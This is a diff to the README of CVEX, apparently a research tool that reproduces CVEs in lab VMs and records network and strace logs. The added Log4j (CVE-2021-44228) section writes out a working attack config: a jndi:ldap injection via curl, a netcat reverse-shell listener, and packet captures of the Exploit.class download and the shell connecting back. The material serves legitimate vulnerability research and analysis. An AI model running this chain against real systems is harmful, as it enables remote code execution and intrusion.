@@ -45,13 +45,21 @@ sudo apt install virtualbox virtualbox-ext-pack
 
 ## Run
 
-CVEX comes with a set of PoC CVEs:
-- [CVE-000000-00](records/CVE-000000-00): curl, executed on Windows, downloads a web-page from ngix, running on Ubuntu
-- [CVE-000000-01](records/CVE-000000-01): curl, executed on Ubuntu, downloads a web-page from ngix, running on another Ubuntu
-- [CVE-000000-02](records/CVE-000000-02): curl, executed on Ubuntu, downloads a web-page from ngix, running on Windows
-- [CVE-000000-03](records/CVE-000000-03): curl, executed on Windows, downloads a web-page from ngix, running on another Windows
+Execute from the root CVEX folder:
+```
+~/CVEX$ python3 -m cvex -c CVE-0000-00001
+```
 
-Let's take CVE-000000-00 as an example. [records/CVE-000000-00/cvex.yml](records/CVE-000000-00/cvex.yml) describes the VM infrastructure that allows reproducing this CVE:
+CVEX comes with a set of PoC CVEs:
+- [CVE-0000-00000](records/CVE-0000-00000): curl, executed on Windows, downloads a web-page from ngix, running on Ubuntu
+- [CVE-0000-00001](records/CVE-0000-00001): curl, executed on Ubuntu, downloads a web-page from ngix, running on another Ubuntu
+- [CVE-0000-00002](records/CVE-0000-00002): curl, executed on Ubuntu, downloads a web-page from ngix, running on Windows
+- [CVE-0000-00003](records/CVE-0000-00003): curl, executed on Windows, downloads a web-page from ngix, running on another Windows
+- [CVE-2021-44228](records/CVE-2021-44228): Log4j vulnerability with backconnect to remote shell
+
+<details>
+<summary>Execution of CVE-0000-00000</summary>
+[records/CVE-0000-00000/cvex.yml](records/CVE-0000-00000/cvex.yml) describes the VM infrastructure for this PoC:
 ```
 blueprint: windows10-ubuntu2204
 ubuntu:
@@ -79,8 +87,8 @@ ports: ...       # HTTPS port(s) as integer or list of integers (optional; 443 b
 
 `command` is treated in a special way:
 1. `%vm_name%` will be replaced with the IP address of the VM: `curl https://%ubuntu%:8080/` will turn into `curl https://192.168.56.3:8080/`
-2. Optional `||` splits the command into two parts: 1) the command; 2) the message: for `curl https://%ubuntu%:8080/||Downloaded` CVEX executes `curl https://192.168.56.3:8080/` and then waits until curl prints `Downloaded` to stdout
-3. Optional `&` at the end of the command tells CVEX that the command is non-blocking: for `curl https://%ubuntu%:8080/||Downloaded&` CVEX executes `curl https://192.168.56.3:8080/`, then waits until curl prints `Downloaded` to stdout, and only then executes next command from the list
+2. Optional `&` at the end of the command tells CVEX that it is non-blocking: for `curl https://%ubuntu%:8080/&` CVEX executes `curl https://192.168.56.3:8080/`, and then immediately executes next command without waiting for curl to finish execution
+3. Optional `~~~` splits the command into two parts: 1) the command; 2) the message: for `curl https://%ubuntu%:8080/&~~~Downloaded` CVEX executes `curl https://192.168.56.3:8080/`, then waits until curl prints `Downloaded` to stdout, and then immediately executes next command without waiting for curl to finish execution
 
 CVEX blueprints define minimal network deployments:
 - Ubuntu host attacking Window host
@@ -88,7 +96,7 @@ CVEX blueprints define minimal network deployments:
 - Ubuntu host attacking multiple Windows hosts
 - ...
 
-Contributors can provide additional blueprints. In the case of CVE-000000-00 the blueprint `windows10-ubuntu2204` is stored in [/blueprint/windows10-ubuntu2204/blueprint.yml](/blueprint/windows10-ubuntu2204/blueprint.yml):
+Contributors can provide additional blueprints. In the case of CVE-0000-00000 the blueprint `windows10-ubuntu2204` is stored in [/blueprint/windows10-ubuntu2204/blueprint.yml](/blueprint/windows10-ubuntu2204/blueprint.yml):
 ```
 windows:
   image: "gusztavvargadr/windows-10"
@@ -117,7 +125,7 @@ Full list of parameters of a blueprint:
 
 At first, CVEX pulls the Ubuntu VM from the Vagrant repository and stores the config file of the VM in ~/.cvex/router. This Ubuntu VM will act as a router. It also creates the `clean` snapshot with the initial state of the VM:
 ```
-$ python3 -m cvex -c CVE-000000-00
+~/CVEX$ python3 -m cvex -c CVE-0000-00000
 2024-09-13 13:52:30,081 - INFO - [router] Retrieving status of router...
 2024-09-13 13:52:32,820 - INFO - [router] Initializing a new VM router at /home/john/.cvex/router...
 2024-09-13 13:52:33,766 - INFO - [router] Starting the VM router...
@@ -186,18 +194,18 @@ Sometimes VM initialization takes longer than expected:
 
 In this case we need to wait until the VM is up and the OS is aready. For example, use the VirtualBox GUI. As soon as the OS fully loads, re-run CVEX with `-k`. With this parameter CVEX uses the VMs that are already running:
 ```
-$ python3 -m cvex -c CVE-000000-00 -k
+$ python3 -m cvex -c CVE-0000-00000 -k
 2024-09-13 14:25:18,880 - INFO - [router] Retrieving status of router...
 2024-09-13 14:25:23,828 - INFO - [router] VM router (192.168.56.2) is already running
 2024-09-13 14:25:26,910 - INFO - [router] Retrieving snapshot list of router...
-2024-09-13 14:25:29,701 - INFO - [windows] Looking for a VM with CVE-000000-00/windows snapshot...
+2024-09-13 14:25:29,701 - INFO - [windows] Looking for a VM with CVE-0000-00000/windows snapshot...
 2024-09-13 14:25:35,875 - INFO - [windows] Retrieving status of windows...
 2024-09-13 14:25:41,071 - INFO - [windows] VM windows (192.168.56.3) is already running
 2024-09-13 14:25:45,390 - INFO - [windows] Retrieving snapshot list of windows...
 2024-09-13 14:25:51,738 - INFO - [windows] Creating snapshot 'clean' for VM windows (192.168.56.3)...
 ```
 
-CVEX runs the [ansible/windows.yml](/ansible/windows.yml) Ansible script before creating the `CVE-000000-00/windows` snapshot:
+CVEX runs the [ansible/windows.yml](/ansible/windows.yml) Ansible script before creating the `CVE-0000-00000/windows` snapshot:
 ```
 2024-09-13 14:26:30,209 - INFO - [windows] Executing Ansible playbook ansible/windows.yml...
 2024-09-13 14:26:31,345 - INFO - [windows] 
@@ -230,12 +238,12 @@ CVEX runs the [ansible/windows.yml](/ansible/windows.yml) Ansible script before 
 2024-09-13 14:36:31,914 - INFO - [windows] PLAY RECAP *********************************************************************
 2024-09-13 14:36:31,914 - INFO - [windows] windows                    : ok=8    changed=7    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
 2024-09-13 14:36:31,914 - INFO - [windows] 
-2024-09-13 14:36:32,194 - INFO - [windows] Creating snapshot 'CVE-000000-00/windows' for VM windows (192.168.56.3)...
+2024-09-13 14:36:32,194 - INFO - [windows] Creating snapshot 'CVE-0000-00000/windows' for VM windows (192.168.56.3)...
 ```
 
 After the Windows VM, CVEX runs the Ubuntu VM:
 ```
-2024-09-13 14:37:03,308 - INFO - [ubuntu] Looking for a VM with CVE-000000-00/ubuntu snapshot...
+2024-09-13 14:37:03,308 - INFO - [ubuntu] Looking for a VM with CVE-0000-00000/ubuntu snapshot...
 2024-09-13 14:37:05,749 - INFO - [ubuntu] Retrieving status of ubuntu...
 2024-09-13 14:37:07,563 - INFO - [ubuntu] Initializing a new VM ubuntu at /home/john/.cvex/bento_ubuntu-22.04/202404.23.0/1...
 2024-09-13 14:37:09,382 - INFO - [ubuntu] Starting the VM ubuntu...
@@ -266,9 +274,9 @@ When the VM is up, CVEX runs the [ansible/linux.yml](/ansible/linux.yml) Ansible
 2024-09-13 14:41:34,968 - INFO - [ubuntu] ubuntu                     : ok=3    changed=2    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
 ```
 
-[records/CVE-000000-00/cvex.yml](records/CVE-000000-00/cvex.yml) has an optional parameter `playbook: linux.yml` that specifies the custom Ansible playbook. In our case it installs nginx before creating the `CVE-000000-00/ubuntu` snapshot:
+[records/CVE-0000-00000/cvex.yml](records/CVE-0000-00000/cvex.yml) has an optional parameter `playbook: linux.yml` that specifies the custom Ansible playbook. In our case it installs nginx before creating the `CVE-0000-00000/ubuntu` snapshot:
 ```
-2024-09-13 14:41:35,241 - INFO - [ubuntu] Executing Ansible playbook records/CVE-000000-00/linux.yml...
+2024-09-13 14:41:35,241 - INFO - [ubuntu] Executing Ansible playbook records/CVE-0000-00000/linux.yml...
 2024-09-13 14:41:36,711 - INFO - [ubuntu] 
 2024-09-13 14:41:36,711 - INFO - [ubuntu] PLAY [Linux target] ************************************************************
 2024-09-13 14:41:36,711 - INFO - [ubuntu] 
@@ -301,13 +309,13 @@ When the VM is up, CVEX runs the [ansible/linux.yml](/ansible/linux.yml) Ansible
 2024-09-13 14:42:51,638 - INFO - [ubuntu] PLAY RECAP *********************************************************************
 2024-09-13 14:42:51,639 - INFO - [ubuntu] ubuntu                     : ok=7    changed=6    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
 2024-09-13 14:42:51,639 - INFO - [ubuntu] 
-2024-09-13 14:42:51,776 - INFO - [ubuntu] Creating snapshot 'CVE-000000-00/ubuntu' for VM ubuntu (192.168.56.4)...
+2024-09-13 14:42:51,776 - INFO - [ubuntu] Creating snapshot 'CVE-0000-00000/ubuntu' for VM ubuntu (192.168.56.4)...
 ```
 
 Every VM may have maximum 3 Ansible playbooks:
 1. Configuration playbook ([ansible/linux.yml](/ansible/linux.yml)) - controlled by CVEX developers
 2. Blueprint playbook (none in our case) - controlled by CVEX blueprint contributors
-3. CVE playbook ([records/CVE-000000-00/linux.yml](records/CVE-000000-00/linux.yml)) - controlled by CVEX users
+3. CVE playbook ([records/CVE-0000-00000/linux.yml](records/CVE-0000-00000/linux.yml)) - controlled by CVEX users
 
 At this point all the VMs (router, Windows, Ubuntu) are up and running, the needed software is installed and the needed VM snapshots are created. CVEX performs the following actions:
 - Configures the hosts file on every VM except the router
@@ -400,6 +408,172 @@ Parameter `-o` specifies custom output folder.
 2024-09-13 14:44:38,472 - INFO - [router] Downloading /tmp/cvex/router_raw.pcap...
 2024-09-13 14:44:38,524 - INFO - [router] Downloading /tmp/cvex/router_mitmdump.stream...
 ```
+</details>
+
+<details>
+<summary>Execution of CVE-2021-44228 and analysis of logs</summary>
+[records/CVE-2021-44228/cvex.yml](records/CVE-2021-44228/cvex.yml) describes the VM infrastructure for this CVE:
+```
+blueprint: ubuntu2204-ubuntu2204
+ubuntu1:
+  playbook: ubuntu1.yml
+ubuntu2:
+  playbook: ubuntu2.yml
+  trace: "curl|python3|nc|java"
+  command:
+    - "python3 /opt/log4j-shell-poc/poc.py --userip %ubuntu2% --webport 9999 --lport 1234&~~~Listening on 0.0.0.0:1389"
+    - "nc -nvlp 1234&~~~Listening on 0.0.0.0 1234"
+    # Web server may not reply, which will cause curl to hang
+    - "curl -d 'uname=%24%7Bjndi%3Aldap%3A%2F%2F%ubuntu2%%3A1389%2Fa%7D&password=' http://ubuntu1:8080/login&"
+    - "sleep 10"
+```
+
+Ansible playbook `ubuntu1.yml` installs a Tomcat based web application, vulnerable to the Log4j attack. Ansible playbook `ubuntu2.yml` installs a fake LDAP server and a web server that is hosting the payload.
+
+
+Execution of CVE-2021-44228 is no different from any other CVE:
+```
+~/CVEX$ python3 -m cvex -c CVE-2021-44228
+```
+
+The section "Execution of CVE-0000-00000" describes the execution process in details, therefore we will omit it here. Instead, let's focus on analysis of logs produced by CVEX. The IP address of ubuntu1 is 192.168.56.3, the IP address of ubuntu2 is 192.168.56.4:
+```
+2024-10-09 15:27:10,423 - INFO - [ubuntu1] Restoring VM ubuntu1 (192.168.56.3) to snapshot 'clean'...
+...
+2024-10-09 15:30:14,814 - INFO - [ubuntu2] Restoring VM ubuntu2 (192.168.56.4) to snapshot 'clean'...
+
+```
+
+Final stepts of execution:
+```
+024-10-09 15:33:51,063 - INFO - [ubuntu2] Executing 'python3 /tmp/cvex/agent.py "curl|python3|nc|java" /tmp/cvex ubuntu2'...
+2024-10-09 15:33:52,077 - INFO - [ubuntu2] Executing 'strace -o /tmp/cvex/ubuntu2_strace_python3_0.log python3 /opt/log4j-shell-poc/poc.py --userip 192.168.56.4 --webport 9999 --lport 1234'...
+2024-10-09 15:34:03,010 - INFO - [ubuntu2] Executing 'strace -o /tmp/cvex/ubuntu2_strace_nc_1.log nc -nvlp 1234'...
+2024-10-09 15:34:03,127 - INFO - [ubuntu2] Executing 'strace -o /tmp/cvex/ubuntu2_strace_curl_2.log curl -d 'uname=%24%7Bjndi%3Aldap%3A%2F%2F192.168.56.4%3A1389%2Fa%7D&password=' http://ubuntu1:8080/login'...
+2024-10-09 15:34:03,150 - INFO - [ubuntu2] Executing 'sleep 10'...
+2024-10-09 15:34:13,202 - INFO - [ubuntu2] Executing 'pkill python3'...
+2024-10-09 15:34:13,282 - INFO - [ubuntu2] Executing 'sudo pkill strace'...
+2024-10-09 15:34:13,389 - INFO - [ubuntu2] Executing 'ls /tmp/cvex/*strace*.log'...
+2024-10-09 15:34:13,439 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_curl_2.log...
+2024-10-09 15:34:13,501 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_curl_4821.log...
+2024-10-09 15:34:13,618 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_curl_4824.log...
+2024-10-09 15:34:13,642 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_nc_1.log...
+2024-10-09 15:34:13,672 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_nc_4817.log...
+2024-10-09 15:34:13,693 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_nc_4820.log...
+2024-10-09 15:34:13,704 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_python3_0.log...
+2024-10-09 15:34:13,728 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_python3_4721.log...
+2024-10-09 15:34:13,867 - INFO - [ubuntu2] Downloading /tmp/cvex/ubuntu2_strace_python3_4724.log...
+2024-10-09 15:34:13,877 - INFO - [router] Wait for 5 seconds to let tcpdump and mitmdump flush logs on disk...
+2024-10-09 15:34:18,884 - INFO - [router] Downloading /tmp/cvex/router_raw.pcap...
+2024-10-09 15:34:18,911 - INFO - [router] Downloading /tmp/cvex/router_mitmdump.stream...
+```
+
+To inspect the PCAP file, run tcpdump:
+```
+~/CVEX$ tcpdump -qns 0 -A -r out/router_raw.pcap
+```
+
+The attacker 192.168.56.4 (ubuntu2) issues an HTTP POST request to Apache Tomcat running on 192.168.56.3 (ubuntu1). The POST request contains malicious data `${jndi:ldap://192.168.56.4:1389/a}` in the `uname` field. The data is URL-encoded:
+```
+15:34:03.050477 IP 192.168.56.4.36880 > 192.168.56.3.8080: tcp 219
+E....t@.@.....8...8.....:.u................
+.....$C.POST /login HTTP/1.1
+Host: ubuntu1:8080
+User-Agent: curl/7.81.0
+Accept: */*
+Content-Length: 68
+Content-Type: application/x-www-form-urlencoded
+
+uname=%24%7Bjndi%3Aldap%3A%2F%2F192.168.56.4%3A1389%2Fa%7D&password=
+```
+
+Log4j logs the `${jndi:ldap://192.168.56.4:1389/a}` string. This triggers the JNDI manager to make a request to the LDAP server controlled by the attacker (192.168.56.4:1389). The LDAP server replies with a link to the payload:
+```
+15:34:04.187067 IP 192.168.56.4.1389 > 192.168.56.3.36182: tcp 148
+E.....@.@.d...8...8..m.V.:..Z3.I...........
+.....$G.0.....d....a0..0...javaClassName1...foo0+..javaCodeBase1...http://192.168.56.4:9999/0$..objectClass1...javaNamingReference0...javaFactory1	..Exploit
+15:34:04.187088 IP 192.168.56.4.1389 > 192.168.56.3.36182: tcp 148
+E.....@.?.e...8...8..m.V.:..Z3.I...........
+.....$G.0.....d....a0..0...javaClassName1...foo0+..javaCodeBase1...http://192.168.56.4:9999/0$..objectClass1...javaNamingReference0...javaFactory1	..Exploit
+15:34:04.191353 IP 192.168.56.4.1389 > 192.168.56.3.36182: tcp 14
+E..B..@.@.em..8...8..m.V.:..Z3.I...........
+.....$G.0....e.
+......
+```
+
+JNDI manager requests the payload hosted on http://192.168.56.4:9999/Exploit.class:
+```
+15:34:04.229544 IP 192.168.56.3.41350 > 192.168.56.4.9999: tcp 213
+E..	@.@.>.	...8...8...'...._96.............
+.$Ha...8GET /Exploit.class HTTP/1.1
+Cache-Control: no-cache
+Pragma: no-cache
+User-Agent: Java/1.8.0_102
+Host: 192.168.56.4:9999
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+```
+
+Web server 192.168.56.4:9999 replies with the payload:
+```
+15:34:04.385348 IP 192.168.56.4.9999 > 192.168.56.3.41350: tcp 198
+E.....@.?..#..8...8.'...96.....4...........
+.....$HaHTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/3.10.12
+Date: Wed, 09 Oct 2024 13:33:51 GMT
+Content-type: application/java-vm
+Content-Length: 1361
+Last-Modified: Wed, 09 Oct 2024 13:33:48 GMT
+
+15:34:04.408072 IP 192.168.56.4.9999 > 192.168.56.3.41350: tcp 1361
+E.....@.@.|...8...8.'...96.c...4...........
+.....$I........4.f
+...-...../..0..1
+...2
+...3
+...4..5
+.	.6
+.7.8
+.7.9
+.	.8
+.7.:
+.	.:
+.	.;
+.<.=
+.<.>
+.?.@
+.?.A........2
+.B.C
+.7.D..E
+.7.F
+.	.G..H..I...<init>...()V...Code...LineNumberTable...StackMapTable..H..1..J..5..K..L..E..
+Exceptions..
+SourceFile...Exploit.java........192.168.56.4.../bin/sh...java/lang/ProcessBuilder...java/lang/String....M..N.O..P.Q...java/net/Socket....R..J..S.T..U.T..V.W..X.Y..K..Z.[..\.[..L..].^.._....`..a.b..c.[...java/lang/Exception..d....e.....Exploit...java/lang/Object...java/lang/Process...java/io/InputStream...java/io/OutputStream...([Ljava/lang/String;)V...redirectErrorStream...(Z)Ljava/lang/ProcessBuilder;...start...()Ljava/lang/Process;...(Ljava/lang/String;I)V...getInputStream...()Ljava/io/InputStream;...getErrorStream...getOutputStream...()Ljava/io/OutputStream;...isClosed...()Z..	available...()I...read...write...(I)V...flush...java/lang/Thread...sleep...(J)V..	exitValue...destroy...close.!................... ............*.....L...=..N...Y....Y.-S..........:...	Y+...
+:......:......:......:......:	.....:
+.......`.........
+....................
+....................	............
+....	..............W...:............................!...n.....	...
+.............&...1...8...?...F...T...\...d...q...y.................................!..."...$...%...&."...1....T....#..$...$..%..&..'..'..'..(..(......X..)..*...........+.....,
+```
+
+The payload connects back to netcat ("nc -nvlp 1234" from cvex.yml), executed by the attacker:
+```
+15:34:04.462260 IP 192.168.56.3.60972 > 192.168.56.4.1234: tcp 0
+E..<I.@.?..Y..8...8..,...g........../A.........
+.$IN........
+15:34:04.462345 IP 192.168.56.3.60972 > 192.168.56.4.1234: tcp 0
+E..<I.@.>..Y..8...8..,...g........../A.........
+.$IN........
+15:34:04.464332 IP 192.168.56.4.1234 > 192.168.56.3.60972: tcp 0
+E..<..@.@.Id..8...8....,.Z...g......"..........
+...3.$IN....
+15:34:04.464348 IP 192.168.56.4.1234 > 192.168.56.3.60972: tcp 0
+E..<..@.?.Jd..8...8....,.Z...g......"..........
+...3.$IN....
+```
+
+</details>
 
 ## Debug
 
